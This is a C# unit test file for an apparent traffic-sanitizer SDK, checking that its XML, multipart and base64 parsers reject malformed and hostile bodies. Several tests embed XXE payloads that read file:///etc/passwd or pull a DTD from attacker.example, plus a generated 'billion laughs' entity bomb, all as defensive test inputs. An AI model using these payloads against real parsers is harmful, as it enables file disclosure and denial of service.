using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using TrafficTwin.Sdk.Sanitizing;
using TrafficTwin.Sdk.Tests.Helpers;
using Xunit;

namespace TrafficTwin.Sdk.Tests;

/// <summary>Body formats of spec v1.19 (sanitizer.md 22): hostile XML, multipart edge cases, base64 documents, capture limit.</summary>
public class BodiesTests
{
    private static byte[] B(string s) => Encoding.UTF8.GetBytes(s);

    private static void BadXml(string doc) => Assert.Throws<InvalidBodyException>(() => Xml.Parse(B(doc)));

    [Fact]
    public void XmlRefusesDoctypeAndExternalEntities()
    {
        BadXml("<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>");
        BadXml("<?xml version=\"1.0\"?><!DOCTYPE r SYSTEM \"http://attacker.example/x.dtd\"><r/>");
        BadXml("<r><!DOCTYPE r></r>");
        BadXml("<r><!ENTITY x \"y\"></r>");
    }

    [Fact]
    public void XmlRefusesEntityExpansion()
    {
        var sb = new StringBuilder("<!DOCTYPE lolz [<!ENTITY lol \"lol\">");
        for (int i = 1; i < 10; i++) sb.Append("<!ENTITY lol" + i + " \"" + string.Concat(Enumerable.Repeat("&lol" + (i - 1 == 0 ? "" : (i - 1).ToString()) + ";", 10)) + "\">");
        sb.Append("]><lolz>&lol9;</lolz>");
        BadXml(sb.ToString());
        // without a DTD, an unknown entity is refused too
        BadXml("<r>&lol9;</r>");
        BadXml("<r a=\"&nbsp;\"/>");
        BadXml("<r>a & b</r>");
        BadXml("<r>&amp</r>");
    }

    [Fact]
    public void XmlNestingLimit()
    {
        string Nested(int depth) => string.Concat(Enumerable.Repeat("<a>", depth)) + "x" + string.Concat(Enumerable.Repeat("</a>", depth));
        Assert.NotNull(Xml.Parse(B(Nested(256))));
        BadXml(Nested(257));
        BadXml(Nested(100_000));
    }

    [Fact]
    public void XmlReferencesAndForbiddenCharacters()
    {
        XElem r = Xml.Parse(B("<r a=\"x&#9;y\tz\">&lt;&#x41;&#66;&amp;<![CDATA[<&>]]></r>"));
        Assert.Equal("x\ty z", r.Attrs[0].Value);
        Assert.Equal("<AB&<&>", r.Text.ToString());
        BadXml("<r>&#0;</r>");
        BadXml("<r>&#x110000;</r>");
        BadXml("<r>&#xD800;</r>");
        BadXml("<r>&#99999999999999999999;</r>");
        BadXml("<r>\u0001</r>");
        BadXml("<r>￾</r>");
        Assert.Throws<InvalidBodyException>(() => Xml.Parse(new byte[] { (byte)'<', (byte)'r', (byte)'>', 0xC3, (byte)'<', (byte)'/', (byte)'r', (byte)'>' }));
    }

    [Fact]
    public void XmlStructureErrors()
    {
        BadXml("");
        BadXml("   ");
        BadXml("<a></b>");
        BadXml("<a/><b/>");
        BadXml("x<a/>");
        BadXml("<a/>x");
        BadXml("<a x=\"1\" x=\"2\"/>");
        BadXml("<a x=\"1\"y=\"2\"/>");
        BadXml("<a x=\"<\"/>");
        BadXml("<p:a/>");
        BadXml("<a p:x=\"1\"/>");
        BadXml("<a:b:c xmlns:a=\"u\"/>");
        BadXml("<a xmlns:=\"u\"/>");
        BadXml("<a><![CDATA[x</a>");
        BadXml("<a><!-- x</a>");
        BadXml("<1a/>");
        BadXml("<a>");
    }

    [Fact]
    public void XmlTreeNamespacesAndFormat()
    {
        string doc = "﻿<?xml version=\"1.0\"?>\r\n<!-- c --><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body>" +
                     "<Get xmlns=\"http://ws.example/customers/3912345678/x\" id=\"1\" b:id=\"2\" xmlns:b=\"urn:b\"><item>1</item><item>2</item>mixed</Get>" +
                     "</s:Body></s:Envelope>";
        XElem root = Xml.Parse(Encoding.UTF8.GetBytes(doc));
        var (tree, entries, fmt) = Xml.Tree(root, 32);
        Assert.Equal("soap11", fmt);
        Assert.Equal(
            "{\"Envelope\":{\"Body\":{\"Get\":{\"#text\":\"mixed\",\"@id\":\"2\",\"item\":[\"1\",\"2\"]}}}}",
            Canonical.Write(Plain.From(tree, false)));
        Assert.Equal(new[]
        {
            ("$.Envelope", "ns:http://schemas.xmlsoap.org/soap/envelope/"),
            ("$.Envelope.Body.Get", "ns:http://ws.example/customers/{*}/x"),
        }, entries.ToArray());
        Assert.Equal("ns:{*}", Xml.NsPattern("mailto:mario.rossi@example.com"));
        Assert.Equal("ns:{none}", Xml.NsPattern(""));
        Assert.Equal("ns:urn:{*}", Xml.NsPattern("urn:0123456789abcdef"));
    }

    [Fact]
    public void SoapActionNames()
    {
        Assert.Equal("GetOrder", Xml.SoapActionName("\"http://ws.example/orders/v2/GetOrder\""));
        Assert.Equal("Renew", Xml.SoapActionName("urn:x#Renew"));
        Assert.Null(Xml.SoapActionName("\"\""));
        Assert.Equal("{*}", Xml.SoapActionName("http://x.example/"));
    }

    private static string Mp(params string[] lines) => string.Join("\r\n", lines);

    [Fact]
    public void MultipartParts()
    {
        string body = Mp("preamble", "--XyZ", "Content-Disposition: form-data; name=\"note\"", "", "hello",
                         "--XyZ  ", "content-disposition: FORM-DATA; filename=\"a\\\"b.pdf\"; name=doc", "Content-Type: application/pdf", "", "%PDF-1.7 ...",
                         "--XyZ", "Content-Disposition: form-data; name=\"note\"; name=\"other\"", "", "",
                         "--XyZ--", "epilogue");
        var parts = Multipart.Parse(B(body), "XyZ");
        Assert.Equal(3, parts.Count);
        Assert.Equal(("note", false, "hello"), (parts[0].Name, parts[0].IsFile, Encoding.UTF8.GetString(parts[0].Content)));
        Assert.Equal(("doc", true), (parts[1].Name, parts[1].IsFile));
        Assert.Equal("application/pdf", parts[1].Ct);
        Assert.Equal("drop:file:pdf:l1k", Multipart.FileToken(parts[1].Content, parts[1].Ct));
        Assert.Equal("drop:file:csv:l1k", Multipart.FileToken(B("a,b"), "text/csv"));
        Assert.Equal("drop:file:bin:l1k", Multipart.FileToken(B("a,b"), null));
        Assert.Equal("note", parts[2].Name);
        Assert.Empty(parts[2].Content);
        Assert.Empty(Multipart.Parse(B("--b--"), "b"));
    }

    [Fact]
    public void MultipartInvalid()
    {
        void Bad(string body, string? boundary = "b") => Assert.Throws<InvalidBodyException>(() => Multipart.Parse(B(body), boundary));
        Bad("--b--", null);
        Bad("--b--", new string('a', 71));
        Bad("--b--", "ends with space ");
        Bad("no delimiter at all");
        Bad(Mp("--b", "Content-Disposition: form-data; name=a", "", "x"));               // no close delimiter
        Bad(Mp("--b", "Content-Type: text/plain", "", "x", "--b--"));                   // no content-disposition
        Bad(Mp("--b", "Content-Disposition: attachment; name=a", "", "x", "--b--"));    // not form-data
        Bad(Mp("--b", "Content-Disposition: form-data; filename=a", "", "x", "--b--")); // no name
        Bad(Mp("--b", "Content-Disposition: form-data; name=a", "bad header", "", "x", "--b--"));
        Bad(Mp("--b", "Bad Name: v", "", "x", "--b--"));
        Bad(Mp("--b", "Content-Disposition: form-data; name=\"a", "", "x", "--b--"));    // unterminated quote
        Bad(Mp("--b", "Content-Disposition: form-data; name=\"a\"x", "", "x", "--b--")); // garbage after the quote
        Bad(Mp("--bjunk", "Content-Disposition: form-data; name=a", "", "x", "--b--"));  // garbage after a delimiter
        Bad(Mp("--b", "Content-Disposition: form-data; name=a", "x", "--b--"));          // headers never end
    }

    [Fact]
    public void Base64Documents()
    {
        byte[] pdf = B("%PDF-1.7\n" + new string('x', 100));
        string std = Convert.ToBase64String(pdf);
        Assert.Equal("drop:doc:pdf:l1k", Docs.Base64Doc(std));
        Assert.Equal("drop:doc:pdf:l1k", Docs.Base64Doc(std.TrimEnd('=').Replace('+', '-').Replace('/', '_')));
        Assert.Equal("drop:doc:pdf:l1k", Docs.Base64Doc("data:application/pdf;base64," + std));
        Assert.Null(Docs.Base64Doc("data:application/pdf," + std));
        Assert.Null(Docs.Base64Doc("data:a b;base64," + std));
        Assert.Null(Docs.Base64Doc(Convert.ToBase64String(B("just some text, not a document"))));
        Assert.Null(Docs.Base64Doc("JVBERi0xLjcK" + " "));
        Assert.Null(Docs.Base64Doc("JVBERi0x"));
        Assert.Null(Docs.Base64Doc(std.TrimEnd('=') + "=")); // '=' with a length that is not a multiple of 4
        Assert.Null(Docs.Base64Doc(std.TrimEnd('=') + "==="));
        // non-zero padding bits are ignored (Convert.FromBase64String would accept or reject depending on the runtime)
        byte[] png = { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 1, 2, 3, 4, 5, 6, 7, 8, 9 };
        string p = Convert.ToBase64String(png).TrimEnd('=');
        char last = p[p.Length - 1];
        string dirty = p.Substring(0, p.Length - 1) + (char)(last + 1);
        Assert.Equal("drop:doc:png:l1k", Docs.Base64Doc(dirty));
        byte[] zip = new byte[] { 0x50, 0x4B, 0x03, 0x04 }.Concat(B("....xl/workbook.xml....")).ToArray();
        Assert.Equal("drop:doc:xlsx:l1k", Docs.Base64Doc(Convert.ToBase64String(zip)));
        Assert.Equal("l8m", Docs.DocClass(8388608));
        Assert.Equal("lmax", Docs.DocClass(8388609));
    }

    private static Dictionary<string, object?> WithBodies(Dictionary<string, object?> body, long maxLarge = 0)
    {
        body["bodies"] = PolicyFactory.Map(("xml", true), ("multipart", true), ("docs", true),
            ("max_large_body_bytes", PolicyFactory.N(maxLarge)), ("large_array", PolicyFactory.N(4)), ("large_nested_array", PolicyFactory.N(2)));
        return body;
    }

    private static Policy Load(Dictionary<string, object?> body) =>
        new(PolicyChecks.ValidateBodySchema(Plain.From(JsonParser.Parse(PolicyFactory.BodyBytes(body)), true)));

    [Fact]
    public void CaptureLimitCoversLargeBodies()
    {
        Assert.Equal(2049, Load(PolicyFactory.Shop(maxBodyBytes: 2048)).CaptureLimit);
        Assert.Equal(200001, Load(WithBodies(PolicyFactory.Shop(maxBodyBytes: 2048), 200000)).CaptureLimit);
        Assert.Equal(2049, Load(WithBodies(PolicyFactory.Shop(maxBodyBytes: 2048), 1000)).CaptureLimit);
    }

    [Fact]
    public void PolicyRefusesMalformedBodiesAndShapes()
    {
        var b = WithBodies(PolicyFactory.Shop());
        ((Dictionary<string, object?>)b["bodies"]!).Remove("docs");
        Assert.Throws<RefusedException>(() => Load(b));
        b = WithBodies(PolicyFactory.Shop(), 67108865);
        Assert.Throws<RefusedException>(() => Load(b));
        b = PolicyFactory.Shop();
        ((Dictionary<string, object?>)((Dictionary<string, object?>)b["global"]!)["request"]!)["body"] =
            PolicyFactory.List(PolicyFactory.Rule("$.a", PolicyFactory.Map(("action", "keep"), ("shape", "alnum"))));
        Assert.Throws<RefusedException>(() => Load(b));
        ((Dictionary<string, object?>)((Dictionary<string, object?>)b["global"]!)["request"]!)["body"] =
            PolicyFactory.List(PolicyFactory.Rule("$.a.@id", PolicyFactory.Map(("action", "code"), ("shape", "alnum"))),
                               PolicyFactory.Rule("$.a.#text", PolicyFactory.Map(("action", "code"))));
        Load(b);
    }

    [Fact]
    public void HostileXmlThroughTheSanitizer()
    {
        var policy = Load(WithBodies(PolicyFactory.Shop()));
        var ring = PolicyChecks.ParseKeyRing(PolicyFactory.HmacKeyLine);
        var (kid, key) = PolicyChecks.SelectKey(ring, policy);
        var san = new Sanitizer(policy, kid, key);
        byte[] body = B("<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>");
        var ex = new Exchange
        {
            Inbound = true,
            ServiceName = "shop-api",
            Method = "POST",
            RawPath = B("/ws"),
            ReqHeaders = new() { ("Content-Type", B("application/soap+xml; charset=utf-8; action=\"urn:x#Renew\"")) },
            ReqBody = body,
            Status = 200,
            RespHeaders = new(),
        };
        var r = san.Run(ex, DateTimeOffset.UtcNow.ToUnixTimeMilliseconds());
        Assert.Equal(Outcome.Event, r.Outcome);
        Assert.Contains("\"body\":\"trunc:invalid-xml\"", r.Canonical);
        Assert.Contains("\"fmt\":\"xml\"", r.Canonical);
        Assert.Contains("\"soap_action\":\"Renew\"", r.Canonical);
        Assert.DoesNotContain("passwd", r.Canonical);
    }
}
